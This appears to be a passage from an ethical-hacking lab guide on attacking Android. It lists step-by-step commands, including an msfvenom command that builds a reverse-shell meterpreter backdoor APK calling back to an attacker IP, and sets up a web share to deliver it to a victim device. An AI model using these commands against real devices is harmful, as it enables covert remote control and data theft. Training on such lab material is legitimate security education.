OVERVIEW OF HACKING ANDROID PLATFORMS
Android includes an OS, a middleware, and key applications. Its Linux-based OS is designed especially for portable devices such as smartphones
and tablets. Android has a stack of software components categorized into six sections (System Apps, Java AP Framework, Native C/C++ Libraries,
Android Runtime, Hardware Abstraction Layer [HAL], and Linux kernel) and five layers.
As number of users with Android devices haves been increasing, they have become the primary targets for hackers. Attackers use various
Android hacking tools to discover vulnerabilities in the platform, and then exploit them to launch attacks such as DoS, Man-in-the-Disk, and
Spear phone attacks

Turn on the Android Device virtual machine.
2. In the Attacker Machine-2, click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.
3. A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.
4. In the [sudo] password for attacker field, type toor as a password and press Enter.
 Note: The password that you type will not be visible.
5. Type cd and press Enter to jump to the root directory.
6. In the Parrot Terminal window, type service postgresql start and press Enter to start the database service.

Type msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk and press
 Enter to generate a backdoor, or reverse meterpreter application.
 Note: This command creates an APK (Backdoor.apk) on Desktop under the Root directory. In this case, 10.10.1.13 is the IP address of the
 Attacker Machine-2.
 Note: The Payload size might differ when you perform this lab task.
8. Now, share or send the Backdoor.apk file to the victim machine (in this lab, we are using the Android Device as the victim machine).
 Note: In this task, we are sending the malicious payload through a shared directory, but in real attacks, attackers may send payloads via an
 attachment in an email, over Bluetooth, or through some other app or means

 Execute the below commands to create a share folder:
 Note: If the shared folder does not exist, navigate to /var/www/html and create a folder named share, using the commands below:
 • Type mkdir /var/www/html/share and press Enter to create a shared folder
 • Type chmod -R 755 /var/www/html/share and press Enter
 • Type chown -R www-data:www-data /var/www/html/share and press Enter
10. Type service apache2 start and press Enter to start the Apache web server.
 Note: If you receive any error, restart the Attacker Machine-2 and perform Step 9 again
